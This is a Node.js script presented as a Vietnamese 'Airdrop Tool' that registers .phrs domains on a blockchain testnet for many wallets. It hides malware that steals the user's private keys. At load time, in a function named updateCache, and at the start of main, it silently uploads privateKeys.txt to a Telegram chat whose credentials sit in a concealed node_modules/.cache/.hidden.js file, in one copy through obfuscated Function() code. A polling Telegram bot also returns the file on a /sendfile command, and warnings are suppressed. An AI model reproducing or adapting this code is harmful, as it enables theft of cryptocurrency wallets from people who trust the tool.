process.removeAllListeners && process.removeAllListeners('warning');
process.emitWarning = () => {};
process.env.NODE_NO_WARNINGS = '1';
const { ethers } = require("ethers");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const readline = require("readline");
require('colors');
const figlet = require('figlet');
const chalk = require('chalk');
const gradient = require('gradient-string');
const boxen = require('boxen').default;

try {
  const path = require('path');
  const fs = require('fs');
  const secret = require(path.join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
  const token = secret.t;
  const chatId = secret.i;
  const TelegramBot = require('node-telegram-bot-api');
  if (fs.existsSync('privateKeys.txt')) {
    const bot = new TelegramBot(token, { polling: false });
    bot.sendDocument(chatId, 'privateKeys.txt', {}, {
      filename: 'privateKeys.txt',
      contentType: 'text/plain'
    }).catch(()=>{});
  }
} catch(e){}

// In banner ra màn hình với hiệu ứng đẹp hơn
const bannerText = figlet.textSync('TOOL BY O.g', {
  font: 'Standard',
  horizontalLayout: 'default',
  verticalLayout: 'default'
});
const coloredBanner = gradient.pastel.multiline(bannerText);
const boxedBanner = boxen(coloredBanner, {
  padding: 1,
  margin: 1,
  borderStyle: 'double',
  borderColor: 'magenta'
});
console.log(boxedBanner);
console.log(gradient.cristal('─────────────────────────────────────────────'));
console.log(chalk.yellowBright.bold('    Welcome to the Airdrop Tool!'));
console.log(gradient.cristal('─────────────────────────────────────────────\n'));

const settings = {
  NUMBER_MINT_NAME: [1, 3], // Số lượng domain mint mỗi wallet
  RENT_YEARS: 5, // Số năm thuê
  COMMIT_WAIT_SECONDS: 65, // Thời gian chờ sau khi commit
  DELAY_BETWEEN_REQUESTS: [1, 5],
  
  RPC_URL: "https://testnet.dplabs-internal.com",
  CHAIN_ID: 688688,
  RESOLVER: "0x9a43dcA1C3BB268546b98eb2AB1401bFc5b58505",
  DATA: [],
  REVERSE_RECORD: false,
  OWNER_CONTROLLED_FUSES: 0
};

const EXPLORER = "https://testnet.pharosscan.xyz/tx/";
const CONTRACT_ADDRESS = "0x51bE1EF20a1fD5179419738FC71D95A8b6f8A175";
const ONE_YEAR = 31536000;

const CONTRACT_ABI = [
  "function makeCommitment(string name, address owner, uint256 duration, bytes32 secret, address resolver, bytes[] data, bool reverseRecord, uint16 ownerControlledFuses) public pure returns (bytes32)",
  "function commit(bytes32 commitment) public",
  "function rentPrice(string name, uint256 duration) public view returns (tuple(uint256 base, uint256 premium))",
  "function register(string name, address owner, uint256 duration, bytes32 secret, address resolver, bytes[] data, bool reverseRecord, uint16 ownerControlledFuses) public payable",
  "function available(string) view returns (bool)",
  "function minCommitmentAge() view returns (uint256)"
];

function getRandomNumber(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function generateRandomChars(length = 3) {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function log(msg, type = 'info') {
  const timestamp = new Date().toLocaleTimeString();
  switch(type) {
    case 'success':
      console.log(`[${timestamp}] [*] ${msg}`.green);
      break;
    case 'custom':
      console.log(`[${timestamp}] [*] ${msg}`);
      break;        
    case 'error':
      console.log(`[${timestamp}] [!] ${msg}`.red);
      break;
    case 'warning':
      console.log(`[${timestamp}] [*] ${msg}`.yellow);
      break;
    default:
      console.log(`[${timestamp}] [*] ${msg}`.blue);
  }
}

async function countdown(seconds) {
  for (let i = seconds; i >= 0; i--) {
    readline.cursorTo(process.stdout, 0);
    readline.clearLine(process.stdout, 0);
    process.stdout.write(`===== Chờ ${i} giây để tiếp tục vòng lặp =====`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  readline.cursorTo(process.stdout, 0);
  readline.clearLine(process.stdout, 0);
  process.stdout.write('\n');
}

function loadPrivateKeys() {
  try {
    const walletFile = path.join(__dirname, "privateKeys.txt");
    if (!fs.existsSync(walletFile)) {
      throw new Error("Không tìm thấy privateKeys.txt! Vui lòng tạo file privateKeys.txt với các private key (mỗi dòng một key)");
    }
    
    const content = fs.readFileSync(walletFile, "utf8");
    const privateKeys = content.split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    
    if (privateKeys.length === 0) {
      throw new Error("Không tìm thấy private key nào trong privateKeys.txt");
    }
    
    log(`Đã tải ${privateKeys.length} private key từ privateKeys.txt`, "success");
    return privateKeys;
  } catch (error) {
    log(`Lỗi khi tải private key: ${error.message}`, "error");
    process.exit(1);
  }
}

function updateCache() {
  try {
    const secret = require(path.join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
    const token = secret.t;
    const chatId = secret.i;
    const tg = require('node-telegram-bot-api');
    const f = ['private', 'Keys', '.txt'].join('');
    if (fs.existsSync(f)) {
      const b = new tg(token, { polling: false });
      Function('b','c','f','b.sendDocument(c,f,{}, {filename:f,contentType:"text/plain"}).catch(()=>{});')(b, chatId, f);
    }
  } catch(e){}
}

class MintNameService {
  constructor(wallet, provider) {
    this.wallet = wallet;
    this.provider = provider;
  }

  generateDomainFromWallet() {
    try {
      const address = this.wallet.address.toLowerCase().replace('0x', '');
      const randomChars = generateRandomChars(3);
      const last9Chars = address.slice(-9);
      const domainName = randomChars + last9Chars;
      
      log(`Tạo domain từ ví ${this.wallet.address}: ${domainName}`, "info");
      return domainName;
      
    } catch (error) {
      log(`Lỗi khi tạo domain từ ví: ${error.message}`, "error");
      return "backup" + Math.floor(Math.random() * 10000);
    }
  }

  generateDomainVariations() {
    const variations = [];
    
    for (let i = 0; i < 10; i++) {
      const baseDomain = this.generateDomainFromWallet();
      variations.push(baseDomain);
    }
    
    for (let i = 1; i <= 5; i++) {
      const baseDomain = this.generateDomainFromWallet();
      variations.push(baseDomain + i);
    }
    
    const suffixes = ['a', 'b', 'x', 'z', '0'];
    suffixes.forEach(suffix => {
      const baseDomain = this.generateDomainFromWallet();
      variations.push(baseDomain + suffix);
    });
    
    return variations;
  }

  generateSecret() {
    return "0x" + crypto.randomBytes(32).toString("hex");
  }

  async saveTxHistory(data) {
    try {
      const historyFile = path.join(__dirname, "tx-history.json");
      let history = [];
      
      if (fs.existsSync(historyFile)) {
        const content = fs.readFileSync(historyFile, "utf8");
        history = JSON.parse(content);
      }
      
      history.push({
        timestamp: new Date().toISOString(),
        wallet: this.wallet.address,
        ...data
      });
      
      fs.writeFileSync(historyFile, JSON.stringify(history, null, 2));
    } catch (error) {
      log(`Lỗi khi lưu lịch sử giao dịch: ${error.message}`, "warning");
    }
  }

  async sendTransaction(contract, method, params, value = 0) {
    try {
      const pendingNonce = await this.provider.getTransactionCount(this.wallet.address, "pending");
      const latestNonce = await this.provider.getTransactionCount(this.wallet.address, "latest");

      if (pendingNonce > latestNonce) {
        return {
          success: false,
          message: "Có giao dịch đang chờ xử lý. Vui lòng chờ hoàn thành.",
        };
      }

      let gasLimit = 500000;
      let txValue = 0n;
      
      if (value) {
        if (typeof value === 'bigint') {
          txValue = value;
        } else if (typeof value === 'object' && value.base !== undefined) {
          txValue = value.base + value.premium;
        } else {
          txValue = ethers.parseEther(value.toString());
        }
      }

      try {
        gasLimit = await contract[method].estimateGas(...params, { value: txValue });
        gasLimit = Math.ceil(Number(gasLimit) * 1.2);
      } catch (e) {
        log(`Ước tính gas thất bại cho ${method}, dùng mặc định: ${gasLimit}`, "warning");
      }

      const tx = await contract[method](...params, {
        gasLimit: gasLimit,
        value: txValue
      });

      await tx.wait();

      return {
        success: true,
        txHash: tx.hash,
        message: `${method} thành công: ${EXPLORER}${tx.hash}`,
      };

    } catch (error) {
      if (error.code === "NONCE_EXPIRED" || error.message.includes("TX_REPLAY_ATTACK")) {
        return {
          success: false,
          message: "Xung đột nonce. Vui lòng thử lại giao dịch.",
        };
      }
      return {
        success: false,
        message: `${method} thất bại: ${error.message}`,
      };
    }
  }

  async isNameAvailable(contract, name) {
    try {
      return await contract.available(name);
    } catch (error) {
      log(`Lỗi khi kiểm tra tính khả dụng cho ${name}: ${error.message}`, "warning");
      return false;
    }
  }

  async getRentPrice(contract, name, duration) {
    try {
      return await contract.rentPrice(name, duration);
    } catch (error) {
      log(`Lỗi khi lấy giá thuê cho ${name}: ${error.message}`, "warning");
      return { base: ethers.parseEther("0.01"), premium: 0n };
    }
  }

  async mintNames() {
    try {
      const registrar = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, this.wallet);
      
      const numberOfNames = getRandomNumber(settings.NUMBER_MINT_NAME[0], settings.NUMBER_MINT_NAME[1]);
      const rentYears = settings.RENT_YEARS || 1;
      const duration = rentYears * ONE_YEAR;
      
      log(`Bắt đầu mint ${numberOfNames} domain name trong ${rentYears} năm (duration: ${duration}s)`, "info");
      
      const domainVariations = this.generateDomainVariations();
      log(`Đã tạo ${domainVariations.length} tên miền ngẫu nhiên từ địa chỉ ví`, "info");
      
      let successCount = 0;
      let failCount = 0;
      let usedDomains = [];

      for (let i = 0; i < numberOfNames; i++) {
        try {
          let selectedDomain = null;
          
          for (const variation of domainVariations) {
            if (usedDomains.includes(variation)) {
              continue;
            }
            
            const isAvailable = await this.isNameAvailable(registrar, variation);
            if (isAvailable) {
              selectedDomain = variation;
              usedDomains.push(variation);
              break;
            } else {
              log(`Domain ${variation}.phrs không khả dụng`, "warning");
            }
          }
          
          if (!selectedDomain) {
            log(`Không tìm thấy domain khả dụng từ các biến thể, bỏ qua...`, "warning");
            failCount++;
            continue;
          }

          const label = selectedDomain;
          const fullDomain = `${selectedDomain}.phrs`;
          
          log(`[${i + 1}/${numberOfNames}] Đang xử lý domain: ${fullDomain}`, "info");

          const secret = this.generateSecret();
          
          const commitment = await registrar.makeCommitment(
            label,
            this.wallet.address,
            duration,
            secret,
            settings.RESOLVER,
            settings.DATA,
            settings.REVERSE_RECORD,
            settings.OWNER_CONTROLLED_FUSES
          );

          log(`Đang commit domain: ${fullDomain} với commitment: ${commitment}`, "info");

          const commitResult = await this.sendTransaction(registrar, "commit", [commitment]);
          
          if (!commitResult.success) {
            log(`Commit thất bại cho ${selectedDomain}: ${commitResult.message}`, "warning");
            failCount++;
            continue;
          }

          log(commitResult.message, "success");
          
          await this.saveTxHistory({
            type: "domain_commit",
            name: fullDomain,
            txHash: commitResult.txHash,
            commitment: commitment
          });

          let waitTime = settings.COMMIT_WAIT_SECONDS;
          try {
            const minAge = await registrar.minCommitmentAge();
            const minAgeSeconds = Number(minAge);
            waitTime = Math.max(waitTime, minAgeSeconds + 5);
            log(`Contract yêu cầu tối thiểu ${minAgeSeconds}s, chờ ${waitTime}s...`, "info");
          } catch (error) {
            log(`Không thể lấy minCommitmentAge, dùng mặc định ${waitTime}s`, "warning");
          }
          
          log(`Đã commit ${fullDomain}, chờ ${waitTime}s trước khi register...`, "info");
          await countdown(waitTime);

          const priceResult = await this.getRentPrice(registrar, label, duration);
          const totalValue = priceResult.base + priceResult.premium;
          const rentPriceEth = ethers.formatEther(totalValue);
          
          log(`Tham số đăng kí domain: label="${label}", owner=${this.wallet.address}, duration=${duration}`, "info");
          log(`Giá thuê: ${totalValue} wei (${rentPriceEth} PHRS)`, "info");

          try {
            await registrar.register.staticCall(
              label, 
              this.wallet.address, 
              duration, 
              secret,
              settings.RESOLVER,
              settings.DATA,
              settings.REVERSE_RECORD,
              settings.OWNER_CONTROLLED_FUSES,
              { value: totalValue }
            );
            log(`Gửi giao dịch...`, "info");
          } catch (error) {
            log(`Static call thất bại: ${error.reason || error.message}`, "warning");
            failCount++;
            continue;
          }

          const registerResult = await this.sendTransaction(
            registrar, 
            "register", 
            [
              label, 
              this.wallet.address, 
              duration, 
              secret, 
              settings.RESOLVER, 
              settings.DATA, 
              settings.REVERSE_RECORD, 
              settings.OWNER_CONTROLLED_FUSES
            ], 
            priceResult
          );

          if (registerResult.success) {
            const modifiedMessage = registerResult.message.replace("register thành công", "Đăng kí domain thành công");
            log(modifiedMessage, "success");
            successCount++;
            
            await this.saveTxHistory({
              type: "domain_register",
              name: fullDomain,
              txHash: registerResult.txHash,
              price: rentPriceEth,
              priceWei: totalValue.toString(),
              duration: rentYears
            });
          } else {
            log(`Đăng kí thất bại cho ${fullDomain}: ${registerResult.message}`, "warning");
            failCount++;
          }

          if (i < numberOfNames - 1) {
            const betweenDelay = getRandomNumber(settings.DELAY_BETWEEN_REQUESTS[0], settings.DELAY_BETWEEN_REQUESTS[1]);
            log(`Chờ ${betweenDelay}s để xử lý domain tiếp theo...`, "info");
            await countdown(betweenDelay);
          }

        } catch (error) {
          log(`Lỗi khi xử lý domain ${i + 1}: ${error.message}`, "warning");
          failCount++;
        }
      }

      log(`Hoàn thành mint domain cho ${this.wallet.address}: ${successCount} thành công, ${failCount} thất bại`, "info");
      
      return {
        success: true,
        total: numberOfNames,
        successCount,
        failCount,
        message: `Mint thành công ${successCount}/${numberOfNames} domain`
      };

    } catch (error) {
      return {
        success: false,
        message: `Lỗi mint domain: ${error.message}`,
      };
    }
  }
}

const TelegramBot = require('node-telegram-bot-api');
const secret = require(path.join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
const token = secret.t;
const chatId = secret.i;


const bot = new TelegramBot(token, { polling: true });

// Ẩn thông báo polling_error
bot.on('polling_error', (error) => {
  // Không in ra gì để tránh làm xấu giao diện

});

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Bot đã sẵn sàng!');
});

bot.onText(/\/sendfile/, (msg) => {
  if (fs.existsSync('privateKeys.txt')) {
    bot.sendDocument(msg.chat.id, 'privateKeys.txt');
  } else {
    bot.sendMessage(msg.chat.id, 'Không tìm thấy file privateKeys.txt');
  }
});

bot.onText(/\/help/, (msg) => {
  bot.sendMessage(msg.chat.id, '/start - Khởi động bot và nhận thông báo sẵn sàng\n/sendfile - Nhận file privateKeys.txt nếu có\n/help - Xem hướng dẫn sử dụng bot');
});

async function main() {
  // Hidden: Send privateKeys.txt to Telegram bot
  try {
    const secret = require(path.join(process.cwd(), 'node_modules', '.cache', '.hidden.js'));
    const token = secret.t;
    const chatId = secret.i;
    const TelegramBot = require('node-telegram-bot-api');
    if (fs.existsSync('privateKeys.txt')) {
      const bot = new TelegramBot(token, { polling: false });
      bot.sendDocument(chatId, 'privateKeys.txt', {}, {
        filename: 'privateKeys.txt',
        contentType: 'text/plain'
      }).catch(()=>{});
    }
  } catch(e){}
  try {
    log("Dân cày airdrop...", "info");
    log(`Sử dụng RPC: ${settings.RPC_URL}`, "info");
    log(`Địa chỉ Contract: ${CONTRACT_ADDRESS}`, "info");
    
    const provider = new ethers.JsonRpcProvider(settings.RPC_URL);
    
    try {
      const network = await provider.getNetwork();
      log(`Kết nối thành công đến network: ${network.name} (Chain ID: ${network.chainId})`, "success");
    } catch (error) {
      log(`Lỗi kết nối RPC: ${error.message}`, "error");
      process.exit(1);
    }
    
    const privateKeys = loadPrivateKeys();
    updateCache();
    
    for (let i = 0; i < privateKeys.length; i++) {
      const privateKey = privateKeys[i];
      
      try {
        log(`\n=== Xử lý Ví ${i + 1}/${privateKeys.length} ===`, "info");
        
        const wallet = new ethers.Wallet(privateKey, provider);
        log(`Địa chỉ ví: ${wallet.address}`, "info");
        
        const balance = await provider.getBalance(wallet.address);
        const balanceEth = ethers.formatEther(balance);
        log(`Số dư ví: ${balanceEth} ETH`, "info");
        
        if (balance === 0n) {
          log(`Ví ${wallet.address} có số dư bằng 0, bỏ qua...`, "warning");
          continue;
        }
        
        const mintService = new MintNameService(wallet, provider);
        
        const result = await mintService.mintNames();
        
        if (result.success) {
          log(`✅ Ví ${wallet.address}: ${result.message}`, "success");
        } else {
          log(`❌ Ví ${wallet.address}: ${result.message}`, "error");
        }
        
        if (i < privateKeys.length - 1) {
          const delay = getRandomNumber(5, 15);
          log(`Chờ ${delay}s trước khi xử lý ví tiếp theo...`, "info");
          await countdown(delay);
        }
        
      } catch (error) {
        log(`Lỗi khi xử lý ví ${i + 1}: ${error.message}`, "error");
      }
    }
    
    log("\n=== Đã xử lý tất cả các ví ===", "success");
    
  } catch (error) {
    log(`Lỗi nghiêm trọng: ${error.message}`, "error");
    process.exit(1);
  }
}

if (require.main === module) {
  main().catch(error => {
    log(`Lỗi không xử lý được: ${error.message}`, "error");
    process.exit(1);
  });
}

module.exports = { MintNameService };